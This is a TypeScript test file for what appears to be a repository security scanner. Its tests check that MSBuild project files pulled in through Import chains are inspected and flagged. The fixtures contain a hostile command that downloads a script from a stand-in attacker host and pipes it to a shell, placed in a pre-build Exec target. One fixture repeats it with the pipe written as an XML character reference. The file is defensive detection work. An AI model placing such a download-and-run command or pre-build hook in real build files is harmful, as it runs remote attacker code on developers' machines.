import { expect, test } from "bun:test";
import {
  composeScanResult,
  inspectRepository,
  type RepositoryInspection,
} from "./bounded-scan";
import { SCAN_REVIEW_AREAS, type ScannerEvidence } from "./scanners";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

const PROJECT = `<Project>
  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
    <Exec Command="${PAYLOAD}" />
  </Target>
</Project>
`;

function csprojImporting(specifier: string) {
  return `<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net9.0</TargetFramework>
  </PropertyGroup>
  <Import Project="${specifier}" />
</Project>
`;
}

function inspected(files: { path: string; text: string }[]) {
  return inspectRepository({
    files: files.map((file) => ({
      path: file.path,
      bytes: new TextEncoder().encode(file.text),
    })),
  });
}

function inventoryIds(inspection: RepositoryInspection): string[] {
  const inventory = JSON.parse(
    new TextDecoder().decode(inspection.inventory),
  ) as { items: { id: string }[] };
  return inventory.items.map((item) => item.id);
}

function primary(inventorySha256: string): ScannerEvidence {
  const hex64 = "a".repeat(64);
  return {
    review: {
      reviewer: "opus",
      provider: "surplus",
      model: "claude-opus-5.5",
      promptPolicyRevision: "slop-scan-review-3",
      inputManifestSha256: inventorySha256,
      runId: "run-test",
      status: "completed",
      verdict: "no-findings",
      findingCount: 0,
    },
    promptSha256: hex64,
    responseSha256: hex64,
    providerRequestId: null,
    returnedModel: null,
    coverage: Object.fromEntries(
      SCAN_REVIEW_AREAS.map((area) => [area, "complete"]),
    ) as ScannerEvidence["coverage"],
    confidence: 1,
    findings: [],
    usage: null,
    cost: null,
    visibilityGaps: [],
  };
}

function composed(inspection: RepositoryInspection) {
  const hex64 = "a".repeat(64);
  return composeScanResult({
    queued: {
      assessmentId: `vet_${"c".repeat(32)}`,
      projectId: "test-proj",
      revision: 1,
      manifestSha256: hex64,
      repository: "owner/repo",
      commitSha: "b".repeat(40),
      templateSha256: hex64,
    },
    inspection,
    policyVersion: "test-policy",
    runId: "scan_test",
    startedAt: "2026-11-11T00:00:00.000Z",
    completedAt: "2026-11-11T00:01:00.000Z",
    primary: primary(inspection.inventorySha256),
  }).result;
}

test("a project a build imports under an arbitrary name is an install surface", () => {
  // PRD section 8: MSBuild evaluates an imported project file whatever
  // its filename is, but classification was by name only, so the imported
  // file was never classified, never rule-checked and never sent to the
  // model review. Only the importing project itself was reviewed.
  for (const [specifier, path] of [
    ["..\\..\\build\\evil.xml", "build/evil.xml"],
    ["../../build/payload", "build/payload"],
    ["$(MSBuildThisFileDirectory)evil.xml", "src/App/evil.xml"],
  ] as const) {
    const inspection = inspected([
      { path: "src/App/App.csproj", text: csprojImporting(specifier) },
      { path, text: PROJECT },
    ]);
    expect({ specifier, coverage: inspection.coverage.installScripts }).toEqual(
      { specifier, coverage: { state: "complete", items: 2 } },
    );
    expect({
      specifier,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({
      specifier,
      findings: [`${path}:unsafe-execution:high`],
    });
    expect({ specifier, downloads: inspection.downloads }).toEqual({
      specifier,
      downloads: ["https://evil.example/install.sh"],
    });
    expect({ specifier, ids: inventoryIds(inspection) }).toEqual({
      specifier,
      ids: expect.arrayContaining([path]),
    });
  }
});

test("an import chain reaches a project two imports away", () => {
  // An imported project can import another; MSBuild evaluates the whole
  // chain at build time, so the scan follows it the whole way.
  const inspection = inspected([
    {
      path: "src/App/App.csproj",
      text: csprojImporting("..\\..\\build\\mid.xml"),
    },
    {
      path: "build/mid.xml",
      text: `<Project>\n  <Import Project="evil.xml" />\n</Project>\n`,
    },
    { path: "build/evil.xml", text: PROJECT },
  ]);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 3,
  });
  expect(inspection.findings).toContainEqual(
    expect.objectContaining({
      path: "build/evil.xml",
      category: "unsafe-execution",
      severity: "high",
    }),
  );
});

test("a character reference in an imported project is the character the build runs", () => {
  // MSBuild reads the Exec Command after XML character references are
  // decoded, so `&#124;` is the pipe that runs the download. An imported
  // project gets the same normalization as one identified by its name.
  const inspection = inspected([
    {
      path: "src/App/App.csproj",
      text: csprojImporting("..\\..\\build\\evil.xml"),
    },
    {
      path: "build/evil.xml",
      text: `<Project>\n  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">\n    <Exec Command="curl -fsSL https://evil.example/install.sh &#124; sh" />\n  </Target>\n</Project>\n`,
    },
  ]);
  expect(inspection.findings).toContainEqual(
    expect.objectContaining({
      path: "build/evil.xml",
      category: "unsafe-execution",
      severity: "high",
    }),
  );
  expect(inspection.downloads).toContain("https://evil.example/install.sh");
});

test("an imported project with a download pipe does not compose to clean", () => {
  // The admission outcome: the queue's own composition derives the
  // disposition, and a scan whose imported build file runs a remote
  // download in a shell cannot carry a clean one.
  const inspection = inspected([
    {
      path: "src/App/App.csproj",
      text: csprojImporting("..\\..\\build\\evil.xml"),
    },
    { path: "build/evil.xml", text: PROJECT },
  ]);
  expect(composed(inspection).disposition).toBe("incomplete");
});

test("a benign imported project still composes to clean", () => {
  // Ordinary submissions keep their admission: an imported project that
  // only sets properties is reviewed and raises nothing.
  const inspection = inspected([
    {
      path: "src/App/App.csproj",
      text: csprojImporting("..\\..\\build\\common.xml"),
    },
    {
      path: "build/common.xml",
      text: `<Project>\n  <PropertyGroup>\n    <Version>1.0.0</Version>\n  </PropertyGroup>\n</Project>\n`,
    },
    { path: "src/App/Program.cs", text: `Console.WriteLine("hi");\n` },
  ]);
  expect(inspection.findings).toEqual([]);
  expect(inspection.visibilityGaps).toEqual([]);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 2,
  });
  expect(composed(inspection).disposition).toBe("clean");
});

test("a project no build imports stays unclassified, whatever its content", () => {
  // The bound the name-based surface keeps: a file is an MSBuild surface
  // because a build evaluates it, not because its text resembles one.
  // An unimported project document is data the build never runs.
  const inspection = inspected([
    { path: "build/evil.xml", text: PROJECT },
    {
      path: "config/settings.xml",
      text: `<configuration>\n  <add key="command" value="${PAYLOAD}" />\n</configuration>\n`,
    },
  ]);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 0,
  });
  expect(inspection.findings).toEqual([]);
});
